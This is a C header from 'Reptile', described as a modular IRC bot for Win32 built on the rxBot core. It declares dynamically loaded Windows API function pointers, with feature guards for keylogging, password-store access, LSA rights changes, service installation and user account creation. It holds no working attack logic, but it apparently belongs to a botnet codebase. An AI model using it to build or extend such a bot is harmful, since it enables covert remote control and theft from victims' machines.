/*

    Reptile - a modular IRC bot for Win32
    Based on the rxBot core by Racerx90

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

/*#ifndef NO_NETSTATP
// Undocumented extended information structures available 
// only on XP and higher
typedef struct {
  DWORD   dwState;        // state of the connection
  DWORD   dwLocalAddr;    // address on local computer
  DWORD   dwLocalPort;    // port number on local computer
  DWORD   dwRemoteAddr;   // address on remote computer
  DWORD   dwRemotePort;   // port number on remote computer
  DWORD	  dwProcessId;
} MIB_TCPEXROW, *PMIB_TCPEXROW;

typedef struct {
	DWORD			dwNumEntries;
	MIB_TCPEXROW	table[ANY_SIZE];
} MIB_TCPEXTABLE, *PMIB_TCPEXTABLE;

typedef struct {
  DWORD   dwLocalAddr;    // address on local computer
  DWORD   dwLocalPort;    // port number on local computer
  DWORD	  dwProcessId;
} MIB_UDPEXROW, *PMIB_UDPEXROW;

typedef struct {
	DWORD			dwNumEntries;
	MIB_UDPEXROW	table[ANY_SIZE];
} MIB_UDPEXTABLE, *PMIB_UDPEXTABLE;
#endif*/

// kernel32.dll function variables
typedef UINT (__stdcall *SEM)(UINT);
typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (__stdcall *M32F)(HANDLE,LPMODULEENTRY32);
typedef BOOL (__stdcall *GDFSE)(LPCTSTR,PULARGE_INTEGER,PULARGE_INTEGER,PULARGE_INTEGER);
typedef DWORD (__stdcall *GLDS)(DWORD,LPTSTR);
typedef UINT (__stdcall *GDT)(LPCTSTR);
typedef DWORD (__stdcall *SP)(LPCTSTR,LPCTSTR,LPCTSTR,DWORD,LPTSTR,LPTSTR *);
typedef BOOL (__stdcall *QPC)(LARGE_INTEGER *);
typedef BOOL (__stdcall *QPF)(LARGE_INTEGER *);
typedef DWORD (__stdcall *RSP)(DWORD,DWORD);
typedef BOOL (__stdcall *GCNA)(LPTSTR,LPDWORD);

// user32.dll function variables
typedef LRESULT (__stdcall *SM)(HWND,UINT,WPARAM,LPARAM);
typedef HWND (__stdcall *FW)(LPCTSTR,LPCTSTR);
typedef BOOL (__stdcall *IW)(HWND);
typedef BOOL (__stdcall *DW)(HWND);
typedef BOOL (__stdcall *CW)(HWND);
typedef BOOL (__stdcall *OC)(HWND);
typedef HANDLE (__stdcall *GCD)(UINT);
typedef BOOL (__stdcall *CC)(VOID);
typedef BOOL (__stdcall *EWE)(UINT,DWORD);
/*#ifndef NO_KEYLOG
typedef SHORT (__stdcall *GAKS)(int);
typedef SHORT (__stdcall *GKS)(int);
typedef int (__stdcall *GWT)(HWND,LPTSTR,int);
typedef HWND (__stdcall *GFW)(VOID);
#endif*/
#ifndef NO_WINDOWCTRL
typedef BOOL (__stdcall *EW)(WNDENUMPROC,LPARAM);
typedef BOOL (__stdcall *GWI)(HWND,PWINDOWINFO);
typedef DWORD (__stdcall *GWTPI)(HWND,LPDWORD);
typedef BOOL (__stdcall *SW)(HWND,int);
typedef BOOL (__stdcall *IWV)(HWND);
typedef BOOL (__stdcall *GCN)(HWND,LPTSTR,int);
#endif

// advapi32.dll function variables
typedef BOOL (__stdcall *ILOU)(HANDLE);

typedef SC_LOCK (__stdcall *LSD)(SC_HANDLE);
typedef BOOL (__stdcall *QSLS)(SC_HANDLE,LPQUERY_SERVICE_LOCK_STATUS,DWORD,LPDWORD);
typedef BOOL (__stdcall *CSC2)(SC_HANDLE,DWORD,LPVOID);
typedef BOOL (__stdcall *USD)(SC_LOCK);
typedef SERVICE_STATUS_HANDLE (__stdcall *RSCH)(LPCTSTR,LPHANDLER_FUNCTION);
typedef BOOL (__stdcall *SSS)(SERVICE_STATUS_HANDLE,LPSERVICE_STATUS);
typedef LONG (__stdcall *ROKE)(HKEY,LPCTSTR,DWORD,REGSAM,PHKEY);
typedef LONG (__stdcall *RCKE)(HKEY,LPCTSTR,DWORD,LPTSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
typedef LONG (__stdcall *RSVE)(HKEY,LPCTSTR,DWORD,DWORD,const BYTE *,DWORD);
typedef LONG (__stdcall *RQVE)(HKEY,LPCTSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD);
typedef LONG (__stdcall *RDV)(HKEY,LPCTSTR);
typedef LONG (__stdcall *RDK)(HKEY,LPCTSTR);
typedef LONG (__stdcall *RCK)(HKEY);
typedef LONG (__stdcall *REKE)(HKEY,DWORD,LPTSTR,LPDWORD,LPDWORD,LPTSTR,LPDWORD,PFILETIME);
typedef LONG (__stdcall *REV)(HKEY,DWORD,LPTSTR,LPDWORD,LPDWORD,LPDWORD,LPBYTE,LPDWORD);
typedef LONG (__stdcall *RQIK)(HKEY,LPTSTR,LPDWORD,LPDWORD,LPDWORD,LPDWORD,LPDWORD,LPDWORD,LPDWORD,LPDWORD,LPDWORD,PFILETIME);
#ifndef NO_PROCESS
typedef BOOL (__stdcall *OTT)(HANDLE,DWORD,BOOL,PHANDLE);
typedef BOOL (__stdcall *OPT)(HANDLE,DWORD,PHANDLE);
typedef BOOL (__stdcall *LPV)(LPCTSTR,LPCTSTR,PLUID);
typedef BOOL (__stdcall *ATP)(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
#endif
#ifndef NO_LSARESTRICT
typedef NTSTATUS (__stdcall *LOP)(PLSA_UNICODE_STRING,PLSA_OBJECT_ATTRIBUTES,ACCESS_MASK,PLSA_HANDLE);
typedef NTSTATUS (__stdcall *LEAWUR)(LSA_HANDLE,PLSA_UNICODE_STRING,PVOID *,PULONG);
typedef NTSTATUS (__stdcall *LLN2)(LSA_HANDLE,ULONG,ULONG,PLSA_UNICODE_STRING,PLSA_REFERENCED_DOMAIN_LIST *,PLSA_TRANSLATED_SID2 *);
typedef NTSTATUS (__stdcall *LAAR)(LSA_HANDLE,PSID,PLSA_UNICODE_STRING,ULONG);
typedef NTSTATUS (__stdcall *LRAR)(LSA_HANDLE,PSID,BOOLEAN,PLSA_UNICODE_STRING,ULONG);
typedef NTSTATUS (__stdcall *LFM)(PVOID);
typedef NTSTATUS (__stdcall *LC)(LSA_HANDLE);
typedef ULONG (__stdcall *LNSTWE)(NTSTATUS);
#endif
/*#ifndef NO_CEL
typedef BOOL (__stdcall *CEL)(HANDLE,LPCTSTR);
typedef BOOL (__stdcall *CLEL)(HANDLE);
typedef HANDLE (__stdcall *OEL)(LPCTSTR,LPCTSTR);
#endif*/
typedef BOOL (__stdcall *SS)(SC_HANDLE,DWORD,LPCTSTR *);
typedef SC_HANDLE (__stdcall *OSCM)(LPCTSTR,LPCTSTR,DWORD);
typedef SC_HANDLE (__stdcall *CRS)(SC_HANDLE,LPCTSTR,LPCTSTR,DWORD,DWORD,DWORD,DWORD,LPCTSTR,LPCTSTR,LPDWORD,LPCTSTR,LPCTSTR,LPCTSTR);
typedef SC_HANDLE (__stdcall *OS)(SC_HANDLE,LPCTSTR,DWORD);
typedef BOOL (__stdcall *CSH)(SC_HANDLE);
typedef BOOL (__stdcall *SSCD) (LPSERVICE_TABLE_ENTRY);
typedef BOOL (__stdcall *ESS)(SC_HANDLE,DWORD,DWORD,LPENUM_SERVICE_STATUS,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef BOOL (__stdcall *CS)(SC_HANDLE,DWORD,LPSERVICE_STATUS);
typedef BOOL (__stdcall *DS)(SC_HANDLE);
typedef BOOL (__stdcall *IVSD)(PSECURITY_DESCRIPTOR);
#ifndef NO_SYSINFO
typedef BOOL (__stdcall *GUN)(LPTSTR,LPDWORD);
#endif

// gdi32.dll function variables
typedef HDC (__stdcall *CDC)(LPCTSTR,LPCTSTR,LPCTSTR,CONST DEVMODE *);
typedef HBITMAP (__stdcall *CDIBS)(HDC,CONST BITMAPINFO *,UINT,VOID **,HANDLE,DWORD);
typedef HDC (__stdcall *CCDC)(HDC);
typedef int (__stdcall *GDC)(HDC,int);
typedef UINT (__stdcall *GDIBCT)(HDC,UINT,UINT,RGBQUAD *);
typedef HGDIOBJ (__stdcall *SO)(HDC,HGDIOBJ);
typedef BOOL (__stdcall *BB)(HDC,int,int,int,int,HDC,int,int,DWORD);
typedef BOOL (__stdcall *DDC)(HDC);
typedef BOOL (__stdcall *DO)(HGDIOBJ);

// ws2_32.dll function variables
typedef int (__stdcall *WSAS)(WORD,LPWSADATA);
typedef SOCKET (__stdcall *WSASo)(int,int,int,LPWSAPROTOCOL_INFO,GROUP,DWORD);
typedef int (__stdcall *WSAAS)(SOCKET,HWND hWnd,unsigned int,long);
typedef int (__stdcall *WSAFDIS)(SOCKET,fd_set *);
typedef int (__stdcall *WSAI)(SOCKET,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPWSAOVERLAPPED,LPWSAOVERLAPPED_COMPLETION_ROUTINE);
typedef int (__stdcall *WSAGLE)(void);
typedef int (__stdcall *WSAC)(void);
typedef SOCKET (__stdcall *SOCK)(int,int,int);
typedef int (__stdcall *IOCTLS)(SOCKET,long cmd,u_long *);
typedef int (__stdcall *CON)(SOCKET,const struct sockaddr *,int);
typedef char * FAR (__stdcall *INTOA)(struct in_addr);
typedef unsigned long (__stdcall *IADDR)(const char *);
typedef u_short (__stdcall *HTONS)(u_short);
typedef u_long (__stdcall *HTONL)(u_long);
typedef u_short (__stdcall *NTOHS)(u_short);
typedef u_long (__stdcall *NTOHL)(u_long);
typedef int (__stdcall *SEND)(SOCKET,const char *,int,int);
typedef int (__stdcall *SENDTO)(SOCKET,const char *,int,int,const struct sockaddr *,int);
typedef int (__stdcall *RECV)(SOCKET,char *,int,int);
typedef int (__stdcall *RECVFROM)(SOCKET,char *,int,int,struct sockaddr *,int *);
typedef int (__stdcall *BIND)(SOCKET,const struct sockaddr *,int);
typedef int (__stdcall *SEL)(int,fd_set *,fd_set *,fd_set *,const struct timeval *);
typedef int (__stdcall *LIS)(SOCKET,int);
typedef SOCKET (__stdcall *ACC)(SOCKET,struct sockaddr *,int *);
typedef int (__stdcall *SSO)(SOCKET,int,int,const char *,int);
typedef int (__stdcall *GSN)(SOCKET,struct sockaddr *,int *);
typedef int (__stdcall *GHN)(char *,int);
typedef struct hostent* FAR (__stdcall *GHBN)(const char *);
typedef struct hostent* FAR (__stdcall *GHBA)(const char *,int,int);
typedef int (__stdcall *GPN)(SOCKET,struct sockaddr*,int*);
typedef int (__stdcall *CLSO)(SOCKET);
typedef int (__stdcall *SD)(SOCKET,int);
/*#ifndef NO_NETSTATP
typedef struct servent* FAR (__stdcall *GSBP)(int,const char*);
#endif*/

// wininet.dll function variables
typedef BOOL (__stdcall *IGCSE)(LPDWORD,LPTSTR,DWORD,DWORD);
typedef BOOL (__stdcall *IGCS)(LPDWORD,DWORD);
typedef HINTERNET (__stdcall *HOR)(HINTERNET,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR *,DWORD,PDWORD);
typedef BOOL (__stdcall *HSR)(HINTERNET,LPCTSTR,DWORD,LPVOID,DWORD);
typedef BOOL (__stdcall *FGF)(HINTERNET,LPCTSTR,LPCTSTR,BOOL,DWORD,DWORD,DWORD_PTR);
typedef BOOL (__stdcall *FPF)(HINTERNET,LPCTSTR,LPCTSTR,DWORD,DWORD_PTR);
typedef HINTERNET (__stdcall *IC)(HINTERNET,LPCTSTR,INTERNET_PORT,LPCTSTR,LPCTSTR,DWORD,DWORD,PDWORD);
typedef HINTERNET (__stdcall *IO)(LPCTSTR,DWORD,LPCTSTR,LPCTSTR,DWORD);
typedef HINTERNET (__stdcall *IOU)(HINTERNET,LPCTSTR,LPCTSTR,DWORD,DWORD,PDWORD);
typedef BOOL (__stdcall *ICU)(LPCTSTR,DWORD,DWORD,LPURL_COMPONENTS);
typedef BOOL (__stdcall *IRF)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (__stdcall *ICH)(HINTERNET);

// icmp.dll function variables
#ifndef NO_PING
typedef HANDLE (__stdcall *ICF)(VOID);
typedef DWORD (__stdcall *ISE)(HANDLE,IPAddr,LPVOID,WORD,PIP_OPTION_INFORMATION,LPVOID,DWORD,DWORD);
typedef BOOL (__stdcall *ICH)(HANDLE);
#endif

// netapi32.dll function variables
typedef NET_API_STATUS (__stdcall *NSA)(LPWSTR,DWORD,LPBYTE,LPDWORD);
typedef NET_API_STATUS (__stdcall *NSD)(LPWSTR,LPWSTR,DWORD);
typedef NET_API_STATUS (__stdcall *NSE)(LPWSTR,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef NET_API_STATUS (__stdcall *NSJA)(LPCWSTR,LPBYTE,LPDWORD);
typedef NET_API_STATUS (__stdcall *NABF)(LPVOID);
typedef NET_API_STATUS (__stdcall *NRTOD)(LPCWSTR,LPBYTE *);
typedef NET_API_STATUS (__stdcall *NUA)(LPCWSTR,DWORD,LPBYTE,LPDWORD);
typedef NET_API_STATUS (__stdcall *NUD)(LPCWSTR,LPCWSTR);
typedef NET_API_STATUS (__stdcall *NUE)(LPCWSTR,DWORD,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef NET_API_STATUS (__stdcall *NUGI)(LPCWSTR,LPCWSTR,DWORD,LPBYTE *);
typedef NET_API_STATUS (__stdcall *NMBS)(LPCWSTR,LPCWSTR,LPCWSTR,LPBYTE,DWORD);

// dnsapi.dll function variables
typedef BOOL (__stdcall *DFRC)(void);
typedef DNS_STATUS (__stdcall *DFRCEA)(LPCSTR);

// iphlpapi.dll function variables
typedef DWORD (__stdcall *GIT)(PMIB_IFTABLE, PULONG, BOOL);
typedef DWORD (__stdcall *GINT)(PMIB_IPNETTABLE,PULONG,BOOL);
typedef DWORD (__stdcall *DINE)(PMIB_IPNETROW);
typedef DWORD (__stdcall *GTT)(PMIB_TCPTABLE,PDWORD,BOOL);
typedef DWORD (__stdcall *GUT)(PMIB_UDPTABLE,PDWORD,BOOL);

/*#ifndef NO_NETSTATP
typedef DWORD (__stdcall *AAGTETFS)(PMIB_TCPEXTABLE *,BOOL,HANDLE,DWORD,DWORD);
typedef DWORD (__stdcall *AAGUETFS)(PMIB_UDPEXTABLE *,BOOL,HANDLE,DWORD,DWORD);
#endif
#ifndef NO_ENETINFO
typedef DWORD (__stdcall *GNP)(PFIXED_INFO,PULONG);
#endif*/

// mpr.dll function variables
typedef DWORD (__stdcall *WNAC2)(LPNETRESOURCE,LPCTSTR,LPCTSTR,DWORD);
typedef DWORD (__stdcall *WNAC2W)(LPNETRESOURCEW,LPCWSTR,LPCWSTR,DWORD);
typedef DWORD (__stdcall *WNCC2)(LPCTSTR,DWORD,BOOL);
typedef DWORD (__stdcall *WNCC2W)(LPCWSTR,DWORD,BOOL);

// shell32.dll function variables
typedef HINSTANCE (__stdcall *SE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT);
typedef void (__stdcall *SHCN)(LONG,UINT,LPCVOID,LPCVOID);

// odbc32.dll function variables
typedef SQLRETURN (__stdcall *SQLDC)(SQLHDBC,SQLHWND,SQLCHAR *,SQLSMALLINT,SQLCHAR *,SQLSMALLINT,SQLSMALLINT *,SQLUSMALLINT);
typedef SQLRETURN (__stdcall *SQLSEA)(SQLHENV,SQLINTEGER,SQLPOINTER,SQLINTEGER);
typedef SQLRETURN (__stdcall *SQLED)(SQLHSTMT,SQLCHAR *,SQLINTEGER);
typedef SQLRETURN (__stdcall *SQLAH)(SQLSMALLINT,SQLHANDLE,SQLHANDLE *);
typedef SQLRETURN (__stdcall *SQLFH)(SQLSMALLINT,SQLHANDLE);
typedef SQLRETURN (__stdcall *SQLD)(SQLHDBC);

/*#ifndef NO_CAPTURE
// avicap32.dll function variables
typedef HWND (__stdcall *cCCW)(LPCSTR,DWORD,int,int,int,int,HWND,int);
typedef BOOL (__stdcall *cGDD)(WORD,LPSTR,INT,LPSTR,INT);
#endif*/

// psapi.dll function variables
typedef DWORD (__stdcall *GMFNE)(HANDLE,HMODULE,LPTSTR,DWORD);
typedef DWORD (__stdcall *GMBN)(HANDLE,HMODULE,LPTSTR,DWORD);
typedef BOOL (__stdcall *EPM)(HANDLE,HMODULE *,DWORD,LPDWORD);
typedef BOOL (__stdcall *EP)(DWORD *,DWORD,DWORD *);
typedef BOOL (__stdcall *GPMI)(HANDLE,PPROCESS_MEMORY_COUNTERS,DWORD);

/*#ifndef NO_PSTORE
//pstorec.dll function variables
typedef HRESULT (__stdcall *PSCI)(IPStore **, DWORD, DWORD, DWORD);
#endif*/

//shlwapi.dll function variables
typedef BOOL (__stdcall *PRFS)(LPTSTR);

BOOL LoadDLLs(void);
void CheckDLLs(char *target,void *conn);
